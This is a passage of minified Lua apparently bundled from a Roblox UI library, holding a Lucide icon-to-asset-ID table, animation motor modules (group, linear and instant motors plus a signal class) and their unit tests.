,['lucide-file-plus-2']='rbxassetid://10723365766',['lucide-file-question']='rbxassetid://10723365987',['lucide-file-scan']='rbxassetid://10723366167',['lucide-file-search']='rbxassetid://10723366550',['lucide-file-search-2']='rbxassetid://10723366340',['lucide-file-signature']='rbxassetid://10723366741',['lucide-file-spreadsheet']='rbxassetid://10723366962',['lucide-file-symlink']='rbxassetid://10723367098',['lucide-file-terminal']='rbxassetid://10723367244',['lucide-file-text']='rbxassetid://10723367380',['lucide-file-type']='rbxassetid://10723367606',['lucide-file-type-2']='rbxassetid://10723367509',['lucide-file-up']='rbxassetid://10723367734',['lucide-file-video']='rbxassetid://10723373884',['lucide-file-video-2']='rbxassetid://10723367834',['lucide-file-volume']='rbxassetid://10723374172',['lucide-file-volume-2']='rbxassetid://10723374030',['lucide-file-warning']='rbxassetid://10723374276',['lucide-file-x']='rbxassetid://10723374544',['lucide-file-x-2']='rbxassetid://10723374378',['lucide-files']='rbxassetid://10723374759',['lucide-film']='rbxassetid://10723374981',['lucide-filter']='rbxassetid://10723375128',['lucide-fingerprint']='rbxassetid://10723375250',['lucide-flag']='rbxassetid://10723375890',['lucide-flag-off']='rbxassetid://10723375443',['lucide-flag-triangle-left']='rbxassetid://10723375608',['lucide-flag-triangle-right']='rbxassetid://10723375727',['lucide-flame']='rbxassetid://10723376114',['lucide-flashlight']='rbxassetid://10723376471',['lucide-flashlight-off']='rbxassetid://10723376365',['lucide-flask-conical']='rbxassetid://10734883986',['lucide-flask-round']='rbxassetid://10723376614',['lucide-flip-horizontal']='rbxassetid://10723376884',['lucide-flip-horizontal-2']='rbxassetid://10723376745',['lucide-flip-vertical']='rbxassetid://10723377138',['lucide-flip-vertical-2']='rbxassetid://10723377026',['lucide-flower']='rbxassetid://10747830374',['lucide-flower-2']='rbxassetid://10723377305',['lucide-focus']='rbxassetid://10723377537',['lucide-folder']='rbxassetid://10723387563',['lucide-folder-archive']='rbxassetid://10723384478',['lucide-folder-check']='rbxassetid://10723384605',['lucide-folder-clock']='rbxassetid://10723384731',['lucide-folder-closed']='rbxassetid://10723384893',['lucide-folder-cog']='rbxassetid://10723385213',['lucide-folder-cog-2']='rbxassetid://10723385036',['lucide-folder-down']='rbxassetid://10723385338',['lucide-folder-edit']='rbxassetid://10723385445',['lucide-folder-heart']='rbxassetid://10723385545',['lucide-folder-input']='rbxassetid://10723385721',['lucide-folder-key']='rbxassetid://10723385848',['lucide-folder-lock']='rbxassetid://10723386005',['lucide-folder-minus']='rbxassetid://10723386127',['lucide-folder-open']='rbxassetid://10723386277',['lucide-folder-output']='rbxassetid://10723386386',['lucide-folder-plus']='rbxassetid://10723386531',['lucide-folder-search']='rbxassetid://10723386787',['lucide-folder-search-2']='rbxassetid://10723386674',['lucide-folder-symlink']='rbxassetid://10723386930',['lucide-folder-tree']='rbxassetid://10723387085',['lucide-folder-up']='rbxassetid://10723387265',['lucide-folder-x']='rbxassetid://10723387448',['lucide-folders']='rbxassetid://10723387721',['lucide-form-input']='rbxassetid://10723387841',['lucide-forward']='rbxassetid://10723388016',['lucide-frame']='rbxassetid://10723394389',['lucide-framer']='rbxassetid://10723394565',['lucide-frown']='rbxassetid://10723394681',['lucide-fuel']='rbxassetid://10723394846',['lucide-function-square']='rbxassetid://10723395041',['lucide-gamepad']='rbxassetid://10723395457',['lucide-gamepad-2']='rbxassetid://10723395215',['lucide-gauge']='rbxassetid://10723395708',['lucide-gavel']='rbxassetid://10723395896',['lucide-gem']='rbxassetid://10723396000',['lucide-ghost']='rbxassetid://10723396107',['lucide-gift']='rbxassetid://10723396402',['lucide-gift-card']='rbxassetid://10723396225',['lucide-git-branch']='rbxassetid://10723396676',['lucide-git-branch-plus']='rbxassetid://10723396542',['lucide-git-commit']='rbxassetid://10723396812',['lucide-git-compare']='rbxassetid://10723396954',['lucide-git-fork']='rbxassetid://10723397049',['lucide-git-merge']='rbxassetid://10723397165',['lucide-git-pull-request']='rbxassetid://10723397431',['lucide-git-pull-request-closed']='rbxassetid://10723397268',['lucide-git-pull-request-draft']='rbxassetid://10734884302',['lucide-glass']='rbxassetid://10723397788',['lucide-glass-2']='rbxassetid://10723397529',['lucide-glass-water']='rbxassetid://10723397678',['lucide-glasses']='rbxassetid://10723397895',['lucide-globe']='rbxassetid://10723404337',['lucide-globe-2']='rbxassetid://10723398002',['lucide-grab']='rbxassetid://10723404472',['lucide-graduation-cap']='rbxassetid://10723404691',['lucide-grape']='rbxassetid://10723404822',['lucide-grid']='rbxassetid://10723404936',['lucide-grip-horizontal']='rbxassetid://10723405089',['lucide-grip-vertical']='rbxassetid://10723405236',['lucide-hammer']='rbxassetid://10723405360',['lucide-hand']='rbxassetid://10723405649',['lucide-hand-metal']='rbxassetid://10723405508',['lucide-hard-drive']='rbxassetid://10723405749',['lucide-hard-hat']='rbxassetid://10723405859',['lucide-hash']='rbxassetid://10723405975',['lucide-haze']='rbxassetid://10723406078',['lucide-headphones']='rbxassetid://10723406165',['lucide-heart']='rbxassetid://10723406885',['lucide-heart-crack']='rbxassetid://10723406299',['lucide-heart-handshake']='rbxassetid://10723406480',['lucide-heart-off']='rbxassetid://10723406662',['lucide-heart-pulse']='rbxassetid://10723406795',['lucide-help-circle']='rbxassetid://10723406988',['lucide-hexagon']='rbxassetid://10723407092',['lucide-highlighter']='rbxassetid://10723407192',['lucide-history']='rbxassetid://10723407335',['lucide-home']='rbxassetid://10723407389',['lucide-hourglass']='rbxassetid://10723407498',['lucide-ice-cream']='rbxassetid://10723414308',['lucide-image']='rbxassetid://10723415040',['lucide-image-minus']='rbxassetid://10723414487',['lucide-image-off']='rbxassetid://10723414677',['lucide-image-plus']='rbxassetid://10723414827',['lucide-import']='rbxassetid://10723415205',['lucide-inbox']='rbxassetid://10723415335',['lucide-indent']='rbxassetid://10723415494',['lucide-indian-rupee']='rbxassetid://10723415642',['lucide-infinity']='rbxassetid://10723415766',['lucide-info']='rbxassetid://10723415903',['lucide-inspect']='rbxassetid://10723416057',['lucide-italic']='rbxassetid://10723416195',['lucide-japanese-yen']='rbxassetid://10723416363',['lucide-joystick']='rbxassetid://10723416527',['lucide-key']='rbxassetid://10723416652',['lucide-keyboard']='rbxassetid://10723416765',['lucide-lamp']='rbxassetid://10723417513',['lucide-lamp-ceiling']='rbxassetid://10723416922',['lucide-lamp-desk']='rbxassetid://10723417016',['lucide-lamp-floor']='rbxassetid://10723417131',['lucide-lamp-wall-down']='rbxassetid://10723417240',['lucide-lamp-wall-up']='rbxassetid://10723417356',['lucide-landmark']='rbxassetid://10723417608',['lucide-languages']='rbxassetid://10723417703',['lucide-laptop']='rbxassetid://10723423881',['lucide-laptop-2']='rbxassetid://10723417797',['lucide-lasso']='rbxassetid://10723424235',['lucide-lasso-select']='rbxassetid://10723424058',['lucide-laugh']='rbxassetid://10723424372',['lucide-layers']='rbxassetid://10723424505',['lucide-layout']='rbxassetid://10723425376',['lucide-layout-dashboard']='rbxassetid://10723424646',['lucide-layout-grid']='rbxassetid://10723424838',['lucide-layout-list']='rbxassetid://10723424963',['lucide-layout-template']='rbxassetid://10723425187',['lucide-leaf']='rbxassetid://10723425539',['lucide-library']='rbxassetid://10723425615',['lucide-life-buoy']='rbxassetid://10723425685',['lucide-lightbulb']='rbxassetid://10723425852',['lucide-lightbulb-off']='rbxassetid://10723425762',['lucide-line-chart']='rbxassetid://10723426393',['lucide-link']='rbxassetid://10723426722',['lucide-link-2']='rbxassetid://10723426595',['lucide-link-2-off']='rbxassetid://10723426513',['lucide-list']='rbxassetid://10723433811',['lucide-list-checks']='rbxassetid://10734884548',['lucide-list-end']='rbxassetid://10723426886',['lucide-list-minus']='rbxassetid://10723426986',['lucide-list-music']='rbxassetid://10723427081',['lucide-list-ordered']='rbxassetid://10723427199',['lucide-list-plus']='rbxassetid://10723427334',['lucide-list-start']='rbxassetid://10723427494',['lucide-list-video']='rbxassetid://10723427619',['lucide-list-x']='rbxassetid://10723433655',['lucide-loader']='rbxassetid://10723434070',['lucide-loader-2']='rbxassetid://10723433935',['lucide-locate']='rbxassetid://10723434557',['lucide-locate-fixed']='rbxassetid://10723434236',['lucide-locate-off']='rbxassetid://10723434379',['lucide-lock']='rbxassetid://10723434711',['lucide-log-in']='rbxassetid://10723434830',['lucide-log-out']='rbxassetid://10723434906',['lucide-luggage']='rbxassetid://10723434993',['lucide-magnet']='rbxassetid://10723435069',['lucide-mail']='rbxassetid://10734885430',['lucide-mail-check']='rbxassetid://10723435182',['lucide-mail-minus']='rbxassetid://10723435261',['lucide-mail-open']='rbxassetid://10723435342',['lucide-mail-plus']='rbxassetid://10723435443',['lucide-mail-question']='rbxassetid://10723435515',['lucide-mail-search']='rbxassetid://10734884739',['lucide-mail-warning']='rbxassetid://10734885015',['lucide-mail-x']='rbxassetid://10734885247',['lucide-mails']='rbxassetid://10734885614',['lucide-map']='rbxassetid://10734886202',['lucide-map-pin']='rbxassetid://10734886004',['lucide-map-pin-off']='rbxassetid://10734885803',['lucide-maximize']='rbxassetid://10734886735',['lucide-maximize-2']='rbxassetid://10734886496',['lucide-medal']='rbxassetid://10734887072',['lucide-megaphone']='rbxassetid://10734887454',['lucide-megaphone-off']='rbxassetid://10734887311',['lucide-meh']='rbxassetid://10734887603',['lucide-menu']='rbxassetid://10734887784',['lucide-message-circle']='rbxassetid://10734888000',['lucide-message-square']='rbxassetid://10734888228',['lucide-mic']='rbxassetid://10734888864',['lucide-mic-2']='rbxassetid://10734888430',['lucide-mic-off']='rbxassetid://10734888646',['lucide-microscope']='rbxassetid://10734889106',['lucide-microwave']='rbxassetid://10734895076',['lucide-milestone']='rbxassetid://10734895310',['lucide-minimize']='rbxassetid://10734895698',['lucide-minimize-2']='rbxassetid://10734895530',['lucide-minus']='rbxassetid://10734896206',['lucide-minus-circle']='rbxassetid://10734895856',['lucide-minus-square']='rbxassetid://10734896029',['lucide-monitor']='rbxassetid://10734896881',['lucide-monitor-off']='rbxassetid://10734896360',['lucide-monitor-speaker']='rbxassetid://10734896512',['lucide-moon']='rbxassetid://10734897102',['lucide-more-horizontal']='rbxassetid://10734897250',['lucide-more-vertical']='rbxassetid://10734897387',['lucide-mountain']='rbxassetid://10734897956',['lucide-mountain-snow']='rbxassetid://10734897665',['lucide-mouse']='rbxassetid://10734898592',['lucide-mouse-pointer']='rbxassetid://10734898476',['lucide-mouse-pointer-2']='rbxassetid://10734898194',['lucide-mouse-pointer-click']='rbxassetid://10734898355',['lucide-move']='rbxassetid://10734900011',['lucide-move-3d']='rbxassetid://10734898756',['lucide-move-diagonal']='rbxassetid://10734899164',['lucide-move-diagonal-2']='rbxassetid://10734898934',['lucide-move-horizontal']='rbxassetid://10734899414',['lucide-move-vertical']='rbxassetid://10734899821',['lucide-music']='rbxassetid://10734905958',['lucide-music-2']='rbxassetid://10734900215',['lucide-music-3']='rbxassetid://10734905665',['lucide-music-4']='rbxassetid://10734905823',['lucide-navigation']='rbxassetid://10734906744',['lucide-navigation-2']='rbxassetid://10734906332',['lucide-navigation-2-off']='rbxassetid://10734906144',['lucide-navigation-off']='rbxassetid://10734906580',['lucide-network']='rbxassetid://10734906975',['lucide-newspaper']='rbxassetid://10734907168',['lucide-octagon']='rbxassetid://10734907361',['lucide-option']='rbxassetid://10734907649',['lucide-outdent']='rbxassetid://10734907933',['lucide-package']='rbxassetid://10734909540',['lucide-package-2']='rbxassetid://10734908151',['lucide-package-check']='rbxassetid://10734908384',['lucide-package-minus']='rbxassetid://10734908626',['lucide-package-open']='rbxassetid://10734908793',['lucide-package-plus']='rbxassetid://10734909016',['lucide-package-search']='rbxassetid://10734909196',['lucide-package-x']='rbxassetid://10734909375',['lucide-paint-bucket']='rbxassetid://10734909847',['lucide-paintbrush']='rbxassetid://10734910187',['lucide-paintbrush-2']='rbxassetid://10734910030',['lucide-palette']='rbxassetid://10734910430',['lucide-palmtree']='rbxassetid://10734910680',['lucide-paperclip']='rbxassetid://10734910927',['lucide-party-popper']='rbxassetid://10734918735',['lucide-pause']='rbxassetid://10734919336',['lucide-pause-circle']='rbxassetid://10735024209',['lucide-pause-octagon']='rbxassetid://10734919143',['lucide-pen-tool']='rbxassetid://10734919503',['lucide-pencil']='rbxassetid://10734919691',['lucide-percent']='rbxassetid://10734919919',['lucide-person-standing']='rbxassetid://10734920149',['lucide-phone']='rbxassetid://10734921524',['lucide-phone-call']='rbxassetid://10734920305',['lucide-phone-forwarded']='rbxassetid://10734920508',['lucide-phone-incoming']='rbxassetid://10734920694',['lucide-phone-missed']='rbxassetid://10734920845',['lucide-phone-off']='rbxassetid://10734921077',['lucide-phone-outgoing']='rbxassetid://10734921288',['lucide-pie-chart']='rbxassetid://10734921727',['lucide-piggy-bank']='rbxassetid://10734921935',['lucide-pin']='rbxassetid://10734922324',['lucide-pin-off']='rbxassetid://10734922180',['lucide-pipette']='rbxassetid://10734922497',['lucide-pizza']='rbxassetid://10734922774',['lucide-plane']='rbxassetid://10734922971',['lucide-play']='rbxassetid://10734923549',['lucide-play-circle']='rbxassetid://10734923214',['lucide-plus']='rbxassetid://10734924532',['lucide-plus-circle']='rbxassetid://10734923868',['lucide-plus-square']='rbxassetid://10734924219',['lucide-podcast']='rbxassetid://10734929553',['lucide-pointer']='rbxassetid://10734929723',['lucide-pound-sterling']='rbxassetid://10734929981',['lucide-power']='rbxassetid://10734930466',['lucide-power-off']='rbxassetid://10734930257',['lucide-printer']='rbxassetid://10734930632',['lucide-puzzle']='rbxassetid://10734930886',['lucide-quote']='rbxassetid://10734931234',['lucide-radio']='rbxassetid://10734931596',['lucide-radio-receiver']='rbxassetid://10734931402',['lucide-rectangle-horizontal']='rbxassetid://10734931777',['lucide-rectangle-vertical']='rbxassetid://10734932081',['lucide-recycle']='rbxassetid://10734932295',['lucide-redo']='rbxassetid://10734932822',['lucide-redo-2']='rbxassetid://10734932586',['lucide-refresh-ccw']='rbxassetid://10734933056',['lucide-refresh-cw']='rbxassetid://10734933222',['lucide-refrigerator']='rbxassetid://10734933465',['lucide-regex']='rbxassetid://10734933655',['lucide-repeat']='rbxassetid://10734933966',['lucide-repeat-1']='rbxassetid://10734933826',['lucide-reply']='rbxassetid://10734934252',['lucide-reply-all']='rbxassetid://10734934132',['lucide-rewind']='rbxassetid://10734934347',['lucide-rocket']='rbxassetid://10734934585',['lucide-rocking-chair']='rbxassetid://10734939942',['lucide-rotate-3d']='rbxassetid://10734940107',['lucide-rotate-ccw']='rbxassetid://10734940376',['lucide-rotate-cw']='rbxassetid://10734940654',['lucide-rss']='rbxassetid://10734940825',['lucide-ruler']='rbxassetid://10734941018',['lucide-russian-ruble']='rbxassetid://10734941199',['lucide-sailboat']='rbxassetid://10734941354',['lucide-save']='rbxassetid://10734941499',['lucide-scale']='rbxassetid://10734941912',['lucide-scale-3d']='rbxassetid://10734941739',['lucide-scaling']='rbxassetid://10734942072',['lucide-scan']='rbxassetid://10734942565',['lucide-scan-face']='rbxassetid://10734942198',['lucide-scan-line']='rbxassetid://10734942351',['lucide-scissors']='rbxassetid://10734942778',['lucide-screen-share']='rbxassetid://10734943193',['lucide-screen-share-off']='rbxassetid://10734942967',['lucide-scroll']='rbxassetid://10734943448',['lucide-search']='rbxassetid://10734943674',['lucide-send']='rbxassetid://10734943902',['lucide-separator-horizontal']='rbxassetid://10734944115',['lucide-separator-vertical']='rbxassetid://10734944326',['lucide-server']='rbxassetid://10734949856',['lucide-server-cog']='rbxassetid://10734944444',['lucide-server-crash']='rbxassetid://10734944554',['lucide-server-off']='rbxassetid://10734944668',['lucide-settings']='rbxassetid://10734950309',['lucide-settings-2']='rbxassetid://10734950020',['lucide-share']='rbxassetid://10734950813',['lucide-share-2']='rbxassetid://10734950553',['lucide-sheet']='rbxassetid://10734951038',['lucide-shield']='rbxassetid://10734951847',['lucide-shield-alert']='rbxassetid://10734951173',['lucide-shield-check']='rbxassetid://10734951367',['lucide-shield-close']='rbxassetid://10734951535',['lucide-shield-off']='rbxassetid://10734951684',['lucide-shirt']='rbxassetid://10734952036',['lucide-shopping-bag']='rbxassetid://10734952273',['lucide-shopping-cart']='rbxassetid://10734952479',['lucide-shovel']='rbxassetid://10734952773',['lucide-shower-head']='rbxassetid://10734952942',['lucide-shrink']='rbxassetid://10734953073',['lucide-shrub']='rbxassetid://10734953241',['lucide-shuffle']='rbxassetid://10734953451',['lucide-sidebar']='rbxassetid://10734954301',['lucide-sidebar-close']='rbxassetid://10734953715',['lucide-sidebar-open']='rbxassetid://10734954000',['lucide-sigma']='rbxassetid://10734954538',['lucide-signal']='rbxassetid://10734961133',['lucide-signal-high']='rbxassetid://10734954807',['lucide-signal-low']='rbxassetid://10734955080',['lucide-signal-medium']='rbxassetid://10734955336',['lucide-signal-zero']='rbxassetid://10734960878',['lucide-siren']='rbxassetid://10734961284',['lucide-skip-back']='rbxassetid://10734961526',['lucide-skip-forward']='rbxassetid://10734961809',['lucide-skull']='rbxassetid://10734962068',['lucide-slack']='rbxassetid://10734962339',['lucide-slash']='rbxassetid://10734962600',['lucide-slice']='rbxassetid://10734963024',['lucide-sliders']='rbxassetid://10734963400',['lucide-sliders-horizontal']='rbxassetid://10734963191',['lucide-smartphone']='rbxassetid://10734963940',['lucide-smartphone-charging']='rbxassetid://10734963671',['lucide-smile']='rbxassetid://10734964441',['lucide-smile-plus']='rbxassetid://10734964188',['lucide-snowflake']='rbxassetid://10734964600',['lucide-sofa']='rbxassetid://10734964852',['lucide-sort-asc']='rbxassetid://10734965115',['lucide-sort-desc']='rbxassetid://10734965287',['lucide-speaker']='rbxassetid://10734965419',['lucide-sprout']='rbxassetid://10734965572',['lucide-square']='rbxassetid://10734965702',['lucide-star']='rbxassetid://10734966248',['lucide-star-half']='rbxassetid://10734965897',['lucide-star-off']='rbxassetid://10734966097',['lucide-stethoscope']='rbxassetid://10734966384',['lucide-sticker']='rbxassetid://10734972234',['lucide-sticky-note']='rbxassetid://10734972463',['lucide-stop-circle']='rbxassetid://10734972621',['lucide-stretch-horizontal']='rbxassetid://10734972862',['lucide-stretch-vertical']='rbxassetid://10734973130',['lucide-strikethrough']='rbxassetid://10734973290',['lucide-subscript']='rbxassetid://10734973457',['lucide-sun']='rbxassetid://10734974297',['lucide-sun-dim']='rbxassetid://10734973645',['lucide-sun-medium']='rbxassetid://10734973778',['lucide-sun-moon']='rbxassetid://10734973999',['lucide-sun-snow']='rbxassetid://10734974130',['lucide-sunrise']='rbxassetid://10734974522',['lucide-sunset']='rbxassetid://10734974689',['lucide-superscript']='rbxassetid://10734974850',['lucide-swiss-franc']='rbxassetid://10734975024',['lucide-switch-camera']='rbxassetid://10734975214',['lucide-sword']='rbxassetid://10734975486',['lucide-swords']='rbxassetid://10734975692',['lucide-syringe']='rbxassetid://10734975932',['lucide-table']='rbxassetid://10734976230',['lucide-table-2']='rbxassetid://10734976097',['lucide-tablet']='rbxassetid://10734976394',['lucide-tag']='rbxassetid://10734976528',['lucide-tags']='rbxassetid://10734976739',['lucide-target']='rbxassetid://10734977012',['lucide-tent']='rbxassetid://10734981750',['lucide-terminal']='rbxassetid://10734982144',['lucide-terminal-square']='rbxassetid://10734981995',['lucide-text-cursor']='rbxassetid://10734982395',['lucide-text-cursor-input']='rbxassetid://10734982297',['lucide-thermometer']='rbxassetid://10734983134',['lucide-thermometer-snowflake']='rbxassetid://10734982571',['lucide-thermometer-sun']='rbxassetid://10734982771',['lucide-thumbs-down']='rbxassetid://10734983359',['lucide-thumbs-up']='rbxassetid://10734983629',['lucide-ticket']='rbxassetid://10734983868',['lucide-timer']='rbxassetid://10734984606',['lucide-timer-off']='rbxassetid://10734984138',['lucide-timer-reset']='rbxassetid://10734984355',['lucide-toggle-left']='rbxassetid://10734984834',['lucide-toggle-right']='rbxassetid://10734985040',['lucide-tornado']='rbxassetid://10734985247',['lucide-toy-brick']='rbxassetid://10747361919',['lucide-train']='rbxassetid://10747362105',['lucide-trash']='rbxassetid://10747362393',['lucide-trash-2']='rbxassetid://10747362241',['lucide-tree-deciduous']='rbxassetid://10747362534',['lucide-tree-pine']='rbxassetid://10747362748',['lucide-trees']='rbxassetid://10747363016',['lucide-trending-down']='rbxassetid://10747363205',['lucide-trending-up']='rbxassetid://10747363465',['lucide-triangle']='rbxassetid://10747363621',['lucide-trophy']='rbxassetid://10747363809',['lucide-truck']='rbxassetid://10747364031',['lucide-tv']='rbxassetid://10747364593',['lucide-tv-2']='rbxassetid://10747364302',['lucide-type']='rbxassetid://10747364761',['lucide-umbrella']='rbxassetid://10747364971',['lucide-underline']='rbxassetid://10747365191',['lucide-undo']='rbxassetid://10747365484',['lucide-undo-2']='rbxassetid://10747365359',['lucide-unlink']='rbxassetid://10747365771',['lucide-unlink-2']='rbxassetid://10747397871',['lucide-unlock']='rbxassetid://10747366027',['lucide-upload']='rbxassetid://10747366434',['lucide-upload-cloud']='rbxassetid://10747366266',['lucide-usb']='rbxassetid://10747366606',['lucide-user']='rbxassetid://10747373176',['lucide-user-check']='rbxassetid://10747371901',['lucide-user-cog']='rbxassetid://10747372167',['lucide-user-minus']='rbxassetid://10747372346',['lucide-user-plus']='rbxassetid://10747372702',['lucide-user-x']='rbxassetid://10747372992',['lucide-users']='rbxassetid://10747373426',['lucide-utensils']='rbxassetid://10747373821',['lucide-utensils-crossed']='rbxassetid://10747373629',['lucide-venetian-mask']='rbxassetid://10747374003',['lucide-verified']='rbxassetid://10747374131',['lucide-vibrate']='rbxassetid://10747374489',['lucide-vibrate-off']='rbxassetid://10747374269',['lucide-video']='rbxassetid://10747374938',['lucide-video-off']='rbxassetid://10747374721',['lucide-view']='rbxassetid://10747375132',['lucide-voicemail']='rbxassetid://10747375281',['lucide-volume']='rbxassetid://10747376008',['lucide-volume-1']='rbxassetid://10747375450',['lucide-volume-2']='rbxassetid://10747375679',['lucide-volume-x']='rbxassetid://10747375880',['lucide-wallet']='rbxassetid://10747376205',['lucide-wand']='rbxassetid://10747376565',['lucide-wand-2']='rbxassetid://10747376349',['lucide-watch']='rbxassetid://10747376722',['lucide-waves']='rbxassetid://10747376931',['lucide-webcam']='rbxassetid://10747381992',['lucide-wifi']='rbxassetid://10747382504',['lucide-wifi-off']='rbxassetid://10747382268',['lucide-wind']='rbxassetid://10747382750',['lucide-wrap-text']='rbxassetid://10747383065',['lucide-wrench']='rbxassetid://10747383470',['lucide-x']='rbxassetid://10747384394',['lucide-x-circle']='rbxassetid://10747383819',['lucide-x-octagon']='rbxassetid://10747384037',['lucide-x-square']='rbxassetid://10747384217',['lucide-zoom-in']='rbxassetid://10747384552',['lucide-zoom-out']='rbxassetid://10747384679'}}end)()end,[30]=function()local aa,ab,ac=a(30)local ad return(function(...)local ae={SingleMotor=ac(ab.SingleMotor),GroupMotor=ac(ab.GroupMotor),Instant=ac(ab.Instant),Linear=ac(ab.Linear),Spring=ac(ab.Spring),isMotor=ac(ab.isMotor)}return ae end)()end,[31]=function()local aa,ab,ac=a(31)local ad return(function(...)local ae,af,ag,ah=game:GetService'RunService',ac(ab.Parent.Signal),function()end,{}ah.__index=ah function ah.new()return setmetatable({_onStep=af.new(),_onStart=af.new(),_onComplete=af.new()},ah)end function ah.onStep(ai,b)return ai._onStep:connect(b)end function ah.onStart(ai,b)return ai._onStart:connect(b)end function ah.onComplete(ai,b)return ai._onComplete:connect(b)end function ah.start(ai)if not ai._connection then ai._connection=ae.RenderStepped:Connect(function(b)ai:step(b)end)end end function ah.stop(ai)if ai._connection then ai._connection:Disconnect()ai._connection=nil end end ah.destroy=ah.stop ah.step=ag ah.getValue=ag ah.setGoal=ag function ah.__tostring(ai)return'Motor'end return ah end)()end,[32]=function()local aa,ab,ac=a(32)local ad return(function(...)return function()local ae,af=game:GetService'RunService',ac(ab.Parent.BaseMotor)describe('connection management',function()local ag=af.new()it('should hook up connections on :start()',function()ag:start()expect(typeof(ag._connection)).to.equal'RBXScriptConnection'end)it('should remove connections on :stop() or :destroy()',function()ag:stop()expect(ag._connection).to.equal(nil)end)end)it('should call :step() with deltaTime',function()local ag,ah=(af.new())function ag.step(ai,...)ah={...}ag:stop()end ag:start()local ai=ae.RenderStepped:Wait()ae.RenderStepped:Wait()expect(ah).to.be.ok()expect(ah[1]).to.equal(ai)end)end end)()end,[33]=function()local aa,ab,ac=a(33)local ad return(function(...)local ae,af,ag=ac(ab.Parent.BaseMotor),ac(ab.Parent.SingleMotor),ac(ab.Parent.isMotor)local ah=setmetatable({},ae)ah.__index=ah local ai=function(ai)if ag(ai)then return ai end local b=typeof(ai)if b=='number'then return af.new(ai,false)elseif b=='table'then return ah.new(ai,false)end error(('Unable to convert %q to motor; type %s is unsupported'):format(ai,b),2)end function ah.new(b,c)assert(b,'Missing argument #1: initialValues')assert(typeof(b)=='table','initialValues must be a table!')assert(not b.step,[[initialValues contains disallowed property ""step"". Did you mean to put a table of values here?]])local d=setmetatable(ae.new(),ah)if c~=nil then d._useImplicitConnections=c else d._useImplicitConnections=true end d._complete=true d._motors={}for e,g in pairs(b)do d._motors[e]=ai(g)end return d end function ah.step(b,c)if b._complete then return true end local d=true for e,g in pairs(b._motors)do local h=g:step(c)if not h then d=false end end b._onStep:fire(b:getValue())if d then if b._useImplicitConnections then b:stop()end b._complete=true b._onComplete:fire()end return d end function ah.setGoal(b,c)assert(not c.step,[[goals contains disallowed property ""step"". Did you mean to put a table of goals here?]])b._complete=false b._onStart:fire()for d,e in pairs(c)do local g=assert(b._motors[d],('Unknown motor for key %s'):format(d))g:setGoal(e)end if b._useImplicitConnections then b:start()end end function ah.getValue(b)local c={}for d,e in pairs(b._motors)do c[d]=e:getValue()end return c end function ah.__tostring(b)return'Motor(Group)'end return ah end)()end,[34]=function()local aa,ab,ac=a(34)local ad return(function(...)return function()local ae,af,ag=ac(ab.Parent.GroupMotor),ac(ab.Parent.Instant),ac(ab.Parent.Spring)it('should complete when all child motors are complete',function()local ah=ae.new({A=1,B=2},false)expect(ah._complete).to.equal(true)ah:setGoal{A=af.new(3),B=ag.new(4,{frequency=7.5,dampingRatio=1})}expect(ah._complete).to.equal(false)ah:step(1.6666666666666665E-2)expect(ah._complete).to.equal(false)for ai=1,30 do ah:step(1.6666666666666665E-2)end expect(ah._complete).to.equal(true)end)it('should start when the goal is set',function()local ah,ai=ae.new({A=0},false),false ah:onStart(function()ai=not ai end)ah:setGoal{A=af.new(1)}expect(ai).to.equal(true)ah:setGoal{A=af.new(1)}expect(ai).to.equal(false)end)it('should properly return all values',function()local ah=ae.new({A=1,B=2},false)local ai=ah:getValue()expect(ai.A).to.equal(1)expect(ai.B).to.equal(2)end)it('should error when a goal is given to GroupMotor.new',function()local ah=pcall(function()ae.new(af.new(0))end)expect(ah).to.equal(false)end)it([[should error when a single goal is provided to GroupMotor:step]],function()local ah=pcall(function()ae.new{a=1}:setGoal(af.new(0))end)expect(ah).to.equal(false)end)end end)()end,[35]=function()local aa,ab,ac=a(35)local ad return(function(...)local ae={}ae.__index=ae function ae.new(af)return setmetatable({_targetValue=af},ae)end function ae.step(af)return{complete=true,value=af._targetValue}end return ae end)()end,[36]=function()local aa,ab,ac=a(36)local ad return(function(...)return function()local ae=ac(ab.Parent.Instant)it('should return a completed state with the provided value',function()local af=ae.new(1.23)local ag=af:step(0.1,{value=0,complete=false})expect(ag.complete).to.equal(true)expect(ag.value).to.equal(1.23)end)end end)()end,[37]=function()local aa,ab,ac=a(37)local ad return(function(...)local ae={}ae.__index=ae function ae.new(af,ag)assert(af,'Missing argument #1: targetValue')ag=ag or{}return setmetatable({_targetValue=af,_velocity=ag.velocity or 1},ae)end function ae.step(af,ag,ah)local ai,b,c=ag.value,af._velocity,af._targetValue local d=ah*b local e=d>=math.abs(c-ai)ai=ai+d*(c>ai and 1 or-1)if e then ai=af._targetValue b=0 end return{complete=e,value=ai,velocity=b}end return ae end)()end,[38]=function()local aa,ab,ac=a(38)local ad return(function(...)return function()local ae,af=ac(ab.Parent.SingleMotor),ac(ab.Parent.Linear)describe('completed state',function()local ag,ah=ae.new(0,false),af.new(1,{velocity=1})ag:setGoal(ah)for ai=1,60 do ag:step(1.6666666666666665E-2)end it('should complete',function()expect(ag._state.complete).to.equal(true)end)it('should be exactly the goal value when completed',function()expect(ag._state.value).to.equal(1)end)end)describe('uncompleted state',function()local ag,ah=ae.new(0,false),af.new(1,{velocity=1})ag:setGoal(ah)for ai=1,59 do ag:step(1.6666666666666665E-2)end it('should be uncomplete',function()expect(ag._state.complete).to.equal(false)end)end)describe('negative velocity',function()local ag,ah=ae.new(1,false),af.new(0,{velocity=1})ag:setGoal(ah)for ai=1,60 do ag:step(1.6666666666666665E-2)end it('should complete',function()expect(ag._state.complete).to.equal(true)end)it('should be exactly the goal value when completed',function()expect(ag._state.value).to.equal(0)end)end)end end)()end,[39]=function()local aa,ab,ac=a(39)local ad return(function(...)local ae={}ae.__index=ae function ae.new(af,ag)return setmetatable({signal=af,connected=true,_handler=ag},ae)end function ae.disconnect(af)if af.connected then af.connected=false for ag,ah in pairs(af.signal._connections)do if ah==af then table.remove(af.signal._connections,ag)return end end end end local af={}af.__index=af function af.new()return setmetatable({_connections={},_threads={}},af)end function af.fire(ag,...)for ah,ai in pairs(ag._connections)do ai._handler(...)end for b,c in pairs(ag._threads)do coroutine.resume(c,...)end ag._threads={}end function af.connect(ag,ai)local b=ae.new(ag,ai)table.insert(ag._connections,b)return b end function af.wait(ag)table.insert(ag._threads,coroutine.running())return coroutine.yield()end return af end)()end,[40]=function()local aa,ab,ac=a(40)local ad return(function(...)return function()local ae=ac(ab.Parent.Signal)it('should invoke all connections, instantly',function()local af,ag,ai=(ae.new())af:connect(function(b)ag=b end)af:connect(function(b)ai=b end)af:fire'hello'expect(ag).to.equal'hello'expect(ai).to.equal'hello'end)it('should return values when :wait() is called',function()local 